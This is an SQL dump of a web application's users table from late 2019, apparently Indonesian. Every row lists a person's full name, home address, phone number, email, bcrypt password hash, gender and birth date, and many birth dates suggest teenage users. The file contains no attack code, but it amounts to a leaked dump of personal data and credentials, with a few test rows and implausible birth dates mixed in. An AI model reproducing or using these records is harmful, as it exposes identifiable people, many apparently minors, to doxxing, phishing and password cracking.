(140, 'kartika wulandhari', 'perum griya asri 2 blok k11 no 24', '0895414649782', 0, 'krtkwlndrr@gmail.com', '2019-11-29 06:17:30', '$2y$10$3XOflitIslwC0Ens70j/r.re3yyFSlOl0UsX0nNFjf0G7cnH61xyq', 'Perempuan', '2019-07-11', NULL, '2019-11-29 06:16:51', '2019-11-29 06:17:30'),
(141, 'Adlan makaarim yusuf', 'Bumi yapemas indah', '0895414777047', 0, 'adlanyusuf6@gmail.com', '2019-11-29 07:19:11', '$2y$10$YqRdql2xnaffxhynL9dzJOmqbl7uMyuzKPUcLRmw/l57zhH4j3X96', 'Laki-Laki', '2003-09-20', NULL, '2019-11-29 06:17:09', '2019-11-29 07:19:11'),
(142, 'Shahi Zidan', 'Graha Melasti Rw 14 rt 07 Jl tulip 2 fa5 no12', '081323014365', 0, 'shahizidan70@gmail.com', '2019-11-29 06:30:18', '$2y$10$uFs5Qh0nNRdiLvnhu8kR..Xr78YT1qFpI9try/yLoxtsNXpQ2.Nci', 'Laki-Laki', '2019-12-24', NULL, '2019-11-29 06:29:40', '2019-11-29 06:30:18'),
(143, 'Shepira', 'Kp kalibaru, rt 02 rw 012 ds mekarsari tambun selatan', '089639044680', 0, 'shefiraapriliani96@gmail.com', '2019-11-29 06:31:27', '$2y$10$wIKBG2qTvqVhYnwaxU4GtOMg2CpHykVb2QVOEI9NYF5W8IAOq2jku', 'Perempuan', '2002-04-21', NULL, '2019-11-29 06:29:59', '2019-11-29 06:31:27'),
(144, 'Pramana Pangestu', 'Griya Asri', '081284530850', 0, 'nfspangestu@gmail.com', '2019-11-30 07:32:37', '$2y$10$uy5MbNQEL8fUZQQtbPFz.etIiFpMZ2vfEVppCOD34MlhByzxJTTOG', 'Laki-Laki', '2002-07-26', NULL, '2019-11-29 06:36:08', '2019-11-30 07:32:37'),
(145, 'Myra saheefah', 'perumnas 3', '082120036983', 0, 'saheefahmyra@gmail.com', '2019-11-29 06:47:46', '$2y$10$o.cIQH5CC/QIjsV1EFtVROKkj0eLIc.51ERMeoA/nA5wgUrqZFaaG', 'Perempuan', '2000-07-21', NULL, '2019-11-29 06:45:57', '2019-11-29 06:47:46'),
(146, 'nikko esa perdana', 'Bekasi timur permai, blok e 17 nomor 10', '081319104649', 0, 'warkaldulu@gmail.com', '2019-11-29 06:51:25', '$2y$10$nMzs8XISAqRDYDCke6NKSuWPEcXTr1wVhXOfwBLtoDwPpWNykhNLi', 'Laki-Laki', '2000-10-08', NULL, '2019-11-29 06:50:20', '2019-11-29 06:51:25'),
(147, 'Rivaldo Rafi Azhim', 'Tridaya indah estate 4 jln semangka blok c18/2', '081213821270', 0, 'rivaldorafi28@gmail.com', '2019-11-29 06:55:01', '$2y$10$XIQW70fv.zAQH.EZXS/ZmeUcN0MpSrqWh0mB7saF7ry0/T9oe/sou', 'Laki-Laki', '2002-01-04', NULL, '2019-11-29 06:54:25', '2019-11-29 06:55:01'),
(149, 'shafiramaulidina', 'Jl raya mangun jaya rt 004 rw 013', '082112709675', 0, 'shafiramaulidina@gmail.com', NULL, '$2y$10$2jqhkmnlBkgnCQHmlYh2N.BULKKBnY5qAadJWpcgPaB9bctK4dakC', 'Perempuan', '2000-05-03', NULL, '2019-11-29 06:55:32', '2019-11-29 06:55:32'),
(150, 'Ilmi febiani intan', 'Perumahan inkoppol Blok N no 17 RT 04 RW 04', '081517683533', 0, 'febianiintan21@gmail.com', '2019-11-29 07:01:00', '$2y$10$6is4/7SFIYRerGINMMgmVOrtXeHnMSu67.vZMZP0bxvWhhhi8Mtsa', 'Perempuan', '2003-02-21', NULL, '2019-11-29 07:00:11', '2019-11-29 07:01:00'),
(151, 'Pangestu', 'Griya Asri', '081284530850', 0, 'pangestupramana03@gmail.com', '2019-11-29 10:49:38', '$2y$10$isqVPVhPboCk8OYs4WXm6u6l1B4QfF9naMuQADSgvb3PGITyifcYe', 'Laki-Laki', '2002-07-27', NULL, '2019-11-29 07:03:15', '2019-11-29 10:49:38'),
(152, 'Safira Anggraini Irawan', 'Villa Mutiara Jaya', '089604702658', 0, 'sfanggraini19@gmail.com', '2019-11-29 07:07:48', '$2y$10$Gtr.klXyVJnH8AcZENk24eIMDIQnirorZUqWqyfL3ZTcpkDYZe7KC', 'Perempuan', '2000-11-19', NULL, '2019-11-29 07:06:56', '2019-11-29 07:07:48'),
(153, 'Delvia', 'Graha', '088211292629', 0, 'delviadestiyani6570@gmail.com', '2019-11-29 07:09:16', '$2y$10$SKq5r5svm3y9q7C/6Lp1Re6uKdlSNpR8hjpNSwblLQkmYc0c88hBW', 'Perempuan', '2001-12-07', NULL, '2019-11-29 07:08:24', '2019-11-29 07:09:16'),
(154, 'Khamelia Difa', 'Gramapuri Tamansari Blok C21/7', '089608258092', 0, 'khameliaanggraeni@gmail.com', '2019-11-29 07:15:23', '$2y$10$IAjJBDULgvRC1sWA/6ygVu0lDpyOKiIns.9A0J3sRP.rWqVTDM1lu', 'Perempuan', '2002-03-16', NULL, '2019-11-29 07:14:36', '2019-11-29 07:15:23'),
(155, 'kartika wulandhari', 'perum griya asri2 blok k11 no 24', '0895414649782', 0, 'martabaklumpia@gmail.com', NULL, '$2y$10$Dxfqjo21yZqRFVuAwze8NOmP/izr7EzlJOIhIL/1ZBcQd66jWpgte', 'Perempuan', '2019-07-11', NULL, '2019-11-29 07:26:54', '2019-11-29 07:26:54'),
(156, 'Atuh Trisna Mukti', 'Perumahan satria jaya permai blok A2 No 09 RT01/12 kec.Tambun Utara kab.Bekasi kode pos 17566', '0895802327507', 0, 'kedswel@gmail.com', '2019-11-29 07:28:19', '$2y$10$VXJniGfLOxljvWbd6Q/Ex.8PWd5zXaoci6oMseY0YMQzcGaJTUybm', 'Laki-Laki', '2002-12-26', NULL, '2019-11-29 07:27:40', '2019-11-29 07:28:19'),
(157, 'Fransiska Indah', 'Gramapuri Tamansari Blok C21/7', '089675052897', 0, 'Fransiskaindahkusumaningtyas@gmail.com', '2019-11-29 08:02:41', '$2y$10$2MsDFFnIXzuMKw/Yz3ACBuIzg2w1bL7GReDokARqjcCGU5GmPl.6K', 'Perempuan', '2000-11-24', NULL, '2019-11-29 07:57:28', '2019-11-29 08:02:41'),
(158, 'Renatama As\'syahrul Mubaarok', 'Perumahan Taman Puri Cendana Blok D4/6', '081311992014', 0, 'renatama2001@gmail.com', '2019-11-29 07:58:53', '$2y$10$ek/sNQvBi8NwFbvqA9mPJOKROrOYttiMQHNMi5qia84UFMVa9Zhcy', 'Laki-Laki', '2001-11-28', NULL, '2019-11-29 07:57:45', '2019-11-29 07:58:53'),
(159, 'Vro', 'Jl. Hj saimun', '081383307990', 0, 'roroelya1@gmail.com', '2019-11-29 08:00:56', '$2y$10$8jKPmDWcW3HzowJGREqdqebEKY7zT2KDCdCtOhk55VSf01g4yI3Cq', 'Perempuan', '2002-01-14', NULL, '2019-11-29 08:00:33', '2019-11-29 08:00:56'),
(160, 'Tati Wardiati', 'Villa Mutiara Jaya', '089604702658', 0, 'tatiwardiati22@gmail.com', '2019-11-29 08:10:15', '$2y$10$g0ctkKFE3Zhua30TGO2YSOu1PgXuDxZ9vVPLDK7aWOE1Td.a5Jky6', 'Perempuan', '1972-08-22', NULL, '2019-11-29 08:09:01', '2019-11-29 08:10:15'),
(161, 'Zahra Z', 'Tambun', '082117067306', 1, 'kirimkesini27@gmail.com', '2019-11-29 08:12:27', '$2y$10$sUSYIErWtT5YuJQBKPlj2.bPNhx5ZieNMHjZewvTrexb1moxszf7W', 'Perempuan', '2002-09-27', NULL, '2019-11-29 08:11:21', '2019-11-29 08:12:27'),
(162, 'yohana tri puspita', 'papan mas', '081584484657', 0, 'vick4.rahmani4@gmail.com', '2019-11-29 08:18:27', '$2y$10$WqWAzxowb7TgyLQSTrCQ2eNlFhU2BeZO8KaN30PjD0LLvRcQBeNoW', 'Perempuan', '2000-12-30', NULL, '2019-11-29 08:17:23', '2019-11-29 08:18:27'),
(163, 'Salsabila fitriah puteri', 'Griya asri 2 blok.k4 No.23 RT.03 RW.039', '089615712468', 0, 'salsabilafitriahp@gmail.com', '2019-11-29 08:28:58', '$2y$10$TOz6zHLbVdJZHebodDhiE.8Ix0nTvtF.aXeltVU9o.lAZYm6tAAki', 'Perempuan', '2002-12-15', NULL, '2019-11-29 08:28:09', '2019-11-29 08:28:58'),
(164, 'Ilmi intan', 'Perumahan inkoppol blok N no 17 RT 04/04', '081517683533', 0, 'ilmiintanintan@gmail.com', '2019-11-29 15:05:43', '$2y$10$kySR0qtQfsNBnFVw40rRVeoz8uYnE32sZ417f8GWLJxtcqLYtfuKW', 'Perempuan', '2003-02-21', NULL, '2019-11-29 09:05:01', '2019-11-29 15:05:43'),
(165, 'Jefanya sekar', 'Jl. Bintara IV no.16, bekasi barat', '085217938579', 0, 'jefanyasekar2000@gmail.com', '2019-11-29 09:08:20', '$2y$10$wGSdiupjmx51eJKqhf93HObulwLHIjRzud2ENfmPNbR2tLdqMmXLm', 'Perempuan', '2000-12-19', NULL, '2019-11-29 09:07:47', '2019-11-29 09:08:20'),
(166, 'Muhammad Syahid Mu\'afa', 'Puri Cendana Blok C6 no 10', '08994641054', 0, 'syahidmuaffa13@gmail.com', '2019-11-29 09:17:47', '$2y$10$ghrcGV4lq9U4sgU3qMWcxeyxA36gTWkG0kwv.WSPrbzxm6qkvDTd2', 'Laki-Laki', '2004-05-13', NULL, '2019-11-29 09:16:50', '2019-11-29 09:17:47'),
(167, 'Sekar Alifah', 'Bekasi Regensi 2', '0895406051010', 0, 'sekaralifah2@gmail.com', '2019-11-29 09:21:35', '$2y$10$3dBmKqafTLuIBVVOIPUqs.aujZlF0jWh/K/t0/jri1PFgdgw3v8BW', 'Perempuan', '2000-10-23', NULL, '2019-11-29 09:19:30', '2019-11-29 09:21:35'),
(168, 'Alrizmi', 'Taman tridaya indah 1 blok E2/32, kabupaten bekasi, jawa barat', '085794562945', 0, 'allrizmii@gmail.com', '2019-11-29 09:31:13', '$2y$10$TQtNK7kJbduhUwHvnncUnOT85x8wmKTeYLOHs2SSDkc3/A.DyQ1Fi', 'Laki-Laki', '2000-11-23', NULL, '2019-11-29 09:30:42', '2019-11-29 09:31:13'),
(169, 'Yudha Satria', 'Perumahan Graha prima Blok ia no,15 RT 002/007', '081517683548', 0, 'yudakiting78@gmail.con', NULL, '$2y$10$h/XFcV9ilmfAgI.WO.C6hu.4XlSv7NyjH62kZQq45rOUhGB7GGxwK', 'Laki-Laki', '2004-04-11', NULL, '2019-11-29 09:45:27', '2019-11-29 09:45:27'),
(170, 'bella septiani', 'Taman tridaya indah 2 blok j6 no 9', '08979741004', 0, 'bellaseptiani5@gmail.com', NULL, '$2y$10$ExjufJ6Oq7Cb8Y78BH9ileSmunBsw3.CrzS0rcRCgt64tT/hRkM1G', 'Perempuan', '2002-05-09', NULL, '2019-11-29 09:49:22', '2019-11-29 09:49:22'),
(171, 'Edho', 'Villa bekasi indah 2 blok b2 no 12a', '081383910604', 0, 'abdillahridho82@gmail.com', NULL, '$2y$10$rq150/xtkVYyEYelKxzqv.zSOQwYijeA3WgvHAlcaP9cLmlwtbW4S', 'Laki-Laki', '2004-01-08', NULL, '2019-11-29 09:53:58', '2019-11-29 09:53:58'),
(172, 'Renita Intan Dwiyanti', 'Perum graha prima blok e1 no.5, tambun selatan', '085722326889', 0, 'renitaintan08@gmail.com', '2019-11-29 09:58:10', '$2y$10$ahU70rUa8YQoBf0BfzIo.e0dCnZGt7.5Xr/Vv9i9WhVpXMZpuOBFS', 'Perempuan', '2000-09-08', NULL, '2019-11-29 09:57:35', '2019-11-29 09:58:10'),
(173, 'Muhammad Ghaza Ashshidqi', 'Jl.Taman anggrek blok c2 no3, perumahan taman puri cendana 2', '087877467150', 0, 'ghazajr18@gmail.com', '2019-11-29 10:17:35', '$2y$10$cOYuAZweLgL2VdYa1iq6UeT3QA9cBix1bwShl5pv9iuimTYQgMwNi', 'Laki-Laki', '2004-10-08', NULL, '2019-11-29 10:16:53', '2019-11-29 10:17:35'),
(174, 'bella septiani', 'Jl. Krisan Vi blok J6 no 9 RT006/RW015, Tridaya Sakti-Tambun Selatan', '08979741004', 0, 'bellasptni0@gmail.com', '2019-11-29 10:27:46', '$2y$10$hdFre0EcrRAkk4Wri9O2.emxfGHWsen2aNpQIEtsAfG/JCqXAn1Nq', 'Perempuan', '2002-05-09', NULL, '2019-11-29 10:26:40', '2019-11-29 10:27:46'),
(175, 'Evo tegar nurdiansyah', 'bulak kapal permai blok f no 23', '081221885179', 0, 'evotegar6@gmail.com', '2019-11-29 10:30:28', '$2y$10$7fCXSaK2JUnRSeQ5qTo6WuSL5JSlXYd2P7Kkz6L2M5xrKYXvJ1Zxq', 'Laki-Laki', '2004-06-12', NULL, '2019-11-29 10:29:17', '2019-11-29 10:30:28'),
(176, 'TIO YUDHO PRASETIO', 'Jl.diponegoro, Kp.kedung gede, Gg.anggrek 3, rt.03/15, Desa setia mekar tambun selatan', '089643726106', 0, 'tioyudhoprasetio@gmail.com', NULL, '$2y$10$RtS7gHlzNwqU0FWNprxXzuq3Tw5hkqubLb077mlSSGHgw1EhKsdfu', 'Laki-Laki', '2004-05-18', NULL, '2019-11-29 10:41:48', '2019-11-29 10:41:48'),
(177, 'Muhammad arga', 'Cikarang barat, telaga harapan blok D1 no.29-30 17530', '081315081230', 0, 'marrizqillahi@gmail.com', '2019-11-29 10:49:28', '$2y$10$c2LGyeKnusJyKHV/5gOFguD9Xgv/30eNt/u2J08DCNf/4hWu/cw62', 'Laki-Laki', '2003-12-13', NULL, '2019-11-29 10:48:56', '2019-11-29 10:49:28'),
(178, 'Fitri Shafirawati', 'Griya Asri 2 Blok H25 No 1', '082297622245', 0, 'shafirawati25h1@gmail.com', '2019-11-29 10:50:41', '$2y$10$Rh6rSUTsPA3.njg9lF4SBuxJ7LJ7GP3gQQKXxSGlebQ0hv.byz.aG', 'Perempuan', '2004-04-09', NULL, '2019-11-29 10:49:04', '2019-11-29 10:50:41'),
(179, 'Yosep Wahyudi Pratomo', 'Perum Trias Estate JL Harum Manis 7 Blok H8 No 10 RT/06 RW/021 Cibitung.Bekasi', '083814110927', 0, 'yosepwahyudipratomo664@gmail.com', NULL, '$2y$10$YW/cHtIVJh1vZjUuC0PsqOt6I3CgIH1az7KLNnm74KB7U93MqZdsu', 'Laki-Laki', '2018-11-19', NULL, '2019-11-29 10:49:55', '2019-11-29 10:49:55'),
(180, 'Naufal agam', 'Jl.kampung sawah bogo', '0895328089567', 0, 'naufalagam123@gmail.com', NULL, '$2y$10$SKn/jVF5nuDFHdFYfSNAkuV.qcMBoT7uVWC7TuIsQKBatTfCG383q', 'Laki-Laki', '2019-11-17', NULL, '2019-11-29 10:53:11', '2019-11-29 10:53:11'),
(181, 'Hardyansyah Wahyu Arif', 'Perum Puri Cendana Blok E9/10', '0895330034654', 0, 'hardyansyahwa.30@gmail.com', '2019-11-29 10:57:31', '$2y$10$3jbBEOEgs1kQMhICHLSQ7eaVS5D4Xbsmo50jijVlcLomOmu.n3nea', 'Laki-Laki', '2003-12-30', NULL, '2019-11-29 10:57:16', '2019-11-29 10:57:31'),
(182, 'Boy kananda', 'Alamanda regency', '089636246733', 0, 'boyknda@gmail.com', '2019-11-29 11:02:12', '$2y$10$RO1lx/LrHbbPps/IkFDcNOXikGDLzG1MIupx2N46/hn.vbhjJn4be', 'Laki-Laki', '2000-09-25', NULL, '2019-11-29 11:01:08', '2019-11-29 11:02:12'),
(183, 'Doi Prasetyo', 'Kp. Warung asem rt002 RW 003', '0895371077523', 0, 'fioprasetyo2@gmail.com', '2019-11-29 11:02:44', '$2y$10$LwTI05ILhOSeXzeYqeISfujBd5M1nI32lfKJr70ncwqSacsDgByo6', 'Laki-Laki', '2003-08-03', NULL, '2019-11-29 11:01:35', '2019-11-29 11:02:44'),
(184, 'Gilang ramadhan paradise', 'Villa bekasi indah 1', '082130296937', 0, 'gilang.paradise121201@gmail.com', NULL, '$2y$10$krySR3KK3lyTIdAJEumX8.R5Upu9yqMb1tl2wZ/DpXc20eXrUEEwG', 'Laki-Laki', '2001-12-12', NULL, '2019-11-29 11:12:14', '2019-11-29 11:12:14'),
(185, 'Luh agustina aryani', 'Puri juanda regency blok O no7, jl.siliwangi1,Duren Jaya, Bekasi Timur', '081282649457', 0, 'edwarddggg@gmail.com', '2019-11-29 11:23:47', '$2y$10$.DNsjkf9Ueq5vdcgyrjwm.TbiK02372G4m1n6YK0K.8CboFqLOA76', 'Perempuan', '2004-08-15', NULL, '2019-11-29 11:22:44', '2019-11-29 11:23:47'),
(186, 'Aldi Laksono', 'jl. kalibaru no.14, desa Mekarsari tambun selatan', '087885422508', 0, 'aldehlkd@gmail.com', '2019-11-29 11:30:58', '$2y$10$wz7dfdKJ15ICYzyKezkdWuFZGjxC/omtLzKO8Jkx7rht/XnwCU4Zy', 'Laki-Laki', '2004-03-31', NULL, '2019-11-29 11:30:19', '2019-11-29 11:30:58'),
(187, 'Sabrina Febriana', 'Perumahan regensi 1 Blok C3 No3', '089673132571', 0, 'sabrinafbriana@gmail.com', '2019-11-29 11:45:33', '$2y$10$GPpFzFCyfoVguS9jj6VINum5MtjrUgLkdycaCAdxd39zbveCRM31e', 'Perempuan', '2003-02-16', NULL, '2019-11-29 11:42:47', '2019-11-29 11:45:33'),
(188, 'Elvira Herdiana Putri', 'Puri Cendana blok G11 No. 22', '081290460425', 0, 'elviraherdianaputri03@gmail.com', NULL, '$2y$10$DrTGBFnXUeKbSn3ZHDpieuhwTV0p3vUx3M/1F/v1PE5F9yvD3RWUO', 'Perempuan', '2002-03-03', NULL, '2019-11-29 12:09:30', '2019-11-29 12:09:30'),
(189, 'Mohammad Riyan Suryo Buwono', 'Jl. Selat Bali A8/9 Kompas Indah, Tambun Selatan', '081297054245', 0, 'riyansuryobuwono@gmail.com', '2019-11-29 12:14:38', '$2y$10$PX/XRA0EkK0iw.Wcjk6JSebynfCqXe4CxUHu1Al1UKtjWepKnZcVm', 'Laki-Laki', '2004-07-12', NULL, '2019-11-29 12:13:56', '2019-11-29 12:14:38'),
(190, 'shafiramaulidina', 'Jl raya mangun jaya rt 004 rw 013', '082112709675', 0, 'ziplong40@gmail.com', '2019-11-29 12:18:27', '$2y$10$I5ArN8.XzNKJz5A4LP0Tf.QMsPS55mtfCMOnTVwFnDhcuTcutJM22', 'Perempuan', '2000-05-03', NULL, '2019-11-29 12:17:08', '2019-11-29 12:18:27'),
(191, 'Agustinus Wahyu Hertantio', 'Jalan Gemini Blok A 22 No.14', '085773675145', 0, 'agustinustio31@gmail.com', '2019-11-29 12:19:23', '$2y$10$1FM8URXt.eUKDD3ITlv4o.A6dpdIGW0mlwM3PPry7uxKnRd1BV8Zy', 'Laki-Laki', '2004-08-31', NULL, '2019-11-29 12:19:09', '2019-11-29 12:19:23'),
(192, 'Fadhilah rahma indriani', 'Papan mas blok G 42 no 32', '08973550481', 0, 'fadhilah.rahma.indriani@gmail.com', '2019-11-29 12:46:41', '$2y$10$duliiI8tiYEgvrT0LXNMd.iC7OK4DF/c0pq0hVx/oP9WSPcpZdGha', 'Perempuan', '2004-09-25', NULL, '2019-11-29 12:33:54', '2019-11-29 12:46:41'),
(193, 'Nila Sari Puspita Putri', 'Jln pendidikan Mangunjaya tamsel', '087877986561', 0, 'nilasaripuspitaputri@gmail.com', '2019-11-29 12:38:51', '$2y$10$uj9Tpz8eVJGX9X6C2m2O0e6lD8QQSojk63aDDoLK15hjBepkHm2ty', 'Perempuan', '2000-08-29', NULL, '2019-11-29 12:37:32', '2019-11-29 12:38:51'),
(194, 'Bayu aji pangestu', 'Perum Alinda kencana 1', '081224192087', 0, 'rizkykinoy2004@gmail.com', '2019-11-29 14:06:19', '$2y$10$bImBCPY1N1rLt3tYm3HHRe7bc1mqvcosnj5RVxBNv/n4PHsgnUFny', 'Laki-Laki', '2002-09-19', NULL, '2019-11-29 12:42:34', '2019-11-29 14:06:19'),
(195, 'Pamuji', 'Perumahan Mahkota indah blok Ka Kb, desa Mangun jaya 1', '081314393189', 0, 'ajipamuji20@gmail.com', '2019-11-29 12:44:29', '$2y$10$keYEG/.62.ybUyjieOM1Qu9GuwHQqVpX10a1Jau3rcTbevidGV/L2', 'Laki-Laki', '2004-09-23', NULL, '2019-11-29 12:43:44', '2019-11-29 12:44:29'),
(196, 'nurul soliha', 'bulak kapal permai', '081221885179', 0, 'nurullsoliha7@gmail.com', '2019-11-29 13:06:23', '$2y$10$QLVOsiV49/d5fszdvwmTUucHmDVxhmC78zNboMt5VTOIAhgKMopYe', 'Perempuan', '2004-03-03', NULL, '2019-11-29 12:57:36', '2019-11-29 13:06:23'),
(197, 'Aulreh', 'Regensi 1', '087879430900', 0, 'aulreh25@gmail.com', '2019-11-29 13:07:01', '$2y$10$Nmmi6xkLVA/YFFQtmVDTN.U97d3OOoU5lAbuiKr1LKkfokW1M.fUW', 'Laki-Laki', '2019-10-25', NULL, '2019-11-29 13:06:07', '2019-11-29 13:07:01'),
(198, 'nurhikmah', 'gria asri 1 blok b7/4', '087886057914', 0, 'nurhikmah29327@gmail.com', '2019-11-29 13:22:50', '$2y$10$25LvvTbd4WCVaUqpLBLnluqhaw/jLCj8TwwktsxOLQU90UQp0aNsm', 'Perempuan', '2003-10-08', NULL, '2019-11-29 13:19:49', '2019-11-29 13:22:50'),
(199, 'test', 'jajaj', '12312123423', 0, 'noan.enrique@iiron.us', NULL, '$2y$10$mx/X7JvN0GzUSNOgMfEWYe.JzZ5WF9uY8BDcfaWsPBAc.kcfciBoa', 'Laki-Laki', '1222-12-12', NULL, '2019-11-29 13:58:29', '2019-11-29 13:58:29'),
(200, 'Ahmad fauzi', 'Jl .selat halmahera', '087741166399', 0, 'fositifhadcore@gmail.com', '2019-11-29 14:01:24', '$2y$10$5Fkbx8fdfXCjoqNhvJixFOpVYGS5ltTAzJxE5Qr2H5dboFVpzl9PS', 'Laki-Laki', '2003-05-17', NULL, '2019-11-29 14:00:20', '2019-11-29 14:01:24'),
(201, 'kartika wulandhari', 'perum griya asri2 blok k11 no24', '089653559176', 0, 'sradiyah4@gmail.com', '2019-11-29 14:24:41', '$2y$10$RE2r6hA35OleR8zTKACPzegGcEhAP6PaLjm80kf3v0QP7j9kR7W6S', 'Perempuan', '2019-07-11', NULL, '2019-11-29 14:22:34', '2019-11-29 14:24:41'),
(202, 'Test123', 'Test', '123123123123', 0, 'test@test.test', NULL, '$2y$10$RPA2ZXOp9mo5.14cQdHHnOzesGME2c/04p4tCGSktndgZUSyWLCaG', 'Perempuan', '2019-11-29', NULL, '2019-11-29 14:31:41', '2019-11-29 14:31:41'),
(203, 'dendi ramadhan', 'perum permata regensi blok d2 no50', '082249705543', 0, 'dendiramadhan154@gmail.com', '2019-11-29 14:47:23', '$2y$10$pdKb0opZtSTaqVegGJHJhe9goq3YcoNO7ZeKtBZOGuEHs664Nu3jq', 'Laki-Laki', '2001-12-04', NULL, '2019-11-29 14:43:21', '2019-11-29 14:47:23'),
(204, 'Luthfi mauls', 'Pasar tambun', '089630186477', 0, 'luthfimauls02@gmail.com', NULL, '$2y$10$ynbtb.76UYRMiFDWSuT1q.Y5xdHXMNnT1H4spf6D6uc6MNRS6vz4q', 'Laki-Laki', '2002-07-01', NULL, '2019-11-29 14:45:37', '2019-11-29 14:45:37'),
(205, 'ramadhan dendi', 'permata regensi blok d2 no50', '082249705543', 0, 'dendirra154@gmail.com', '2019-11-29 15:00:44', '$2y$10$qN.c7rtf4ymmvXswzvnfBehEY/L3eeArufQQwkWN0JLVwijuKs4vm', 'Laki-Laki', '2001-12-04', NULL, '2019-11-29 14:51:09', '2019-11-29 15:00:44'),
(206, 'Imam budi utomo', 'Perumahan graha prima blok f 6 no 36', '089504224864', 0, 'imamdixon@gmail.com', NULL, '$2y$10$jSGZZPJbE.a8QQWvoWB0xe0D.xrWV.iCKzOqP.W28qLyIVzUj4Cdu', 'Laki-Laki', '2003-12-13', NULL, '2019-11-29 15:08:56', '2019-11-29 15:08:56'),
(207, 'nailah hasna', 'perumahan taman kintamani f9 no 11', '081905645680', 0, 'nailahhdz10@gmail.com', '2019-11-29 15:23:16', '$2y$10$DTsqt7Dn2Bt8oZFZRHS3oO9Q2f3ql15Tc0uHYduzkOlTEBnE3kbV6', 'Perempuan', '2003-09-10', NULL, '2019-11-29 15:21:32', '2019-11-29 15:23:16'),
(208, 'Aldio', 'Griya asri 2', '0812121781247', 0, 'm.aldiosyafikri@gmail.com', '2019-11-29 15:30:46', '$2y$10$xAZf/IFWqvUNg8X6TvAyxeX0.Wg1ajuUIs90L.0N8PwTH2iaNHi5a', 'Laki-Laki', '2000-11-29', NULL, '2019-11-29 15:30:10', '2019-11-29 15:30:46'),
(209, 'Al rizmii', 'Taman tridaya indah 1', '081311359365', 0, 'khowarizmial23@gmail.com', '2019-11-29 15:36:03', '$2y$10$/e5V1uHUTAhoiyVB2x7rJOfcsOdAmR9N2gmBZQzeFMA9nKrGnWH4G', 'Laki-Laki', '2000-11-23', NULL, '2019-11-29 15:35:30', '2019-11-29 15:36:03'),
(210, 'Hari Ferdiansyah', 'Wanasari cibitung bekasi', '082246976872', 0, 'hari.ua2010@gmail.com', '2019-11-29 15:41:15', '$2y$10$ZLMY8s4GUJudcIUA2utJEug/01nqOnOMhGD3TQCwtyRGhSsAkkvAe', 'Laki-Laki', '2004-07-14', NULL, '2019-11-29 15:39:00', '2019-11-29 15:41:15');
INSERT INTO `users` (`id_users`, `nama_users`, `alamat_users`, `notelp_users`, `isAdmin`, `email`, `email_verified_at`, `password`, `jenkel_users`, `tgllahir_users`, `remember_token`, `created_at`, `updated_at`) VALUES
(211, 'Aditya Yusuf Ramadhan', 'Bintara 14', '081273840056', 0, 'adityayusupramadhan@gmail.com', '2019-11-29 16:06:39', '$2y$10$FvwmLRBfhgUyZRBspKKbiOqPBVYomm1zmhGPJmsiUDfN8FUNG/m/2', 'Laki-Laki', '2019-11-29', NULL, '2019-11-29 16:06:10', '2019-11-29 16:06:39'),
(212, 'Retno ayu puspita', 'Taman tridaya indah blok f 14 no 19', '082210711936', 0, 'retnoayu133@gmail.com', '2019-11-29 16:08:56', '$2y$10$9nPlyLxC6rt8m7v3zMLf1.V/MI8N4kPdmxFdGbXL4RJOE7Om5qOpi', 'Perempuan', '1998-12-15', NULL, '2019-11-29 16:07:32', '2019-11-29 16:08:56'),
(213, 'Rifqi zayyan', 'Perum kintamani blok D8/18', '082110679816', 0, 'rifqitmvn@gmail.com', '2019-11-29 16:39:24', '$2y$10$iErlEQ766SaU4mZsHo1GKOiGJvb68AWiinsLm7FAl.tAbbxVPpq0W', 'Laki-Laki', '2019-07-10', NULL, '2019-11-29 16:38:04', '2019-11-29 16:39:24'),
(214, 'Alya Ardi', 'Puri Cendana', '085947340405', 0, 'azraalya2810@gmail.com', '2019-11-29 16:44:50', '$2y$10$pLDfp2j.9uptRo3ZqeNKq.lcgmVZCtHU3bOf.UfeWj3MkJwzos7WC', 'Perempuan', '2004-01-09', NULL, '2019-11-29 16:43:57', '2019-11-29 16:44:50'),
(215, 'Adie subarkah', 'Cibitung, regensi 2', '081297339941', 0, 'adysbrkh@gmail.com', '2019-11-29 16:52:16', '$2y$10$eLFKeGBlojNQk/UGPkM2hOb6yDFMRiUSahxvCfyGY2VGMrAE56hIu', 'Laki-Laki', '2000-01-01', NULL, '2019-11-29 16:51:36', '2019-11-29 16:52:16'),
(216, 'arya dwi putra', 'bekasi timur permai, blok e 17 nomor 10', '081319104649', 0, 'nayk479@gmail.com', '2019-11-29 17:46:27', '$2y$10$Ny1bcvqLjD.B6gVhX8.3U.HBw968.WrRT7ltWNZqMPus8WQVvMvMi', 'Laki-Laki', '2000-10-10', NULL, '2019-11-29 17:44:44', '2019-11-29 17:46:27'),
(217, 'Faris Zarfhan', 'Bekasi Cibitung\r\nPerum.regensi 2', '089688559962', 0, 'muhammadfaris988@gmail.com', '2019-11-29 17:47:41', '$2y$10$ACHmGVArjkGu8gi7.AtGGugP86c7CjPfYOy6SIq.YQSVT6CeKtokO', 'Laki-Laki', '2000-04-25', NULL, '2019-11-29 17:47:06', '2019-11-29 17:47:41'),
(218, 'Bima putra aji pertama', 'Graha prima blok m 10 no 17', '087879066307', 0, 'bimaputra2003@yahho.com', NULL, '$2y$10$F61FBxIp98gs1g486dfXWudtMNncy7XNe1ZDh1F685s7f90J/jpIC', 'Laki-Laki', '2003-09-28', NULL, '2019-11-30 03:00:29', '2019-11-30 03:00:29'),
(219, 'surya', 'taman tridaya indah 1', '087870255459', 0, 'ormail.surya28@gmail.com', '2019-11-30 04:23:48', '$2y$10$WUEZc.AF8b1PLQCImDH98egUTZJb3Um2y/dDfA3fpC5Qn3S1oqvne', 'Laki-Laki', '2003-07-28', NULL, '2019-11-30 04:23:28', '2019-11-30 04:23:48'),
(220, 'Achmad Oktamar', 'Villa mutiara jaya blok M2 no 23 RT 01 RW 07', '081316345940', 0, 'achmadoktamar13@gmail.com', '2019-11-30 04:54:04', '$2y$10$A1Vartr63bdaHcnv82/gte9mVz7WqQmXc1R/e6QaisFFpsyLTGfLm', 'Laki-Laki', '2002-10-13', NULL, '2019-11-30 04:52:51', '2019-11-30 04:54:04'),
(221, 'Tanti ratnapuri', 'Jl. Rambutan I Blok I 1 no 30', '085244882020', 0, 'tantiratnapuri@gmail.com', '2019-11-30 06:48:34', '$2y$10$dIn904P8zE0BiSPtRjsI0OVLcma4zrvMmRBhib9wRaPG7dprDwWIO', 'Perempuan', '2002-12-28', NULL, '2019-11-30 06:47:17', '2019-11-30 06:48:34'),
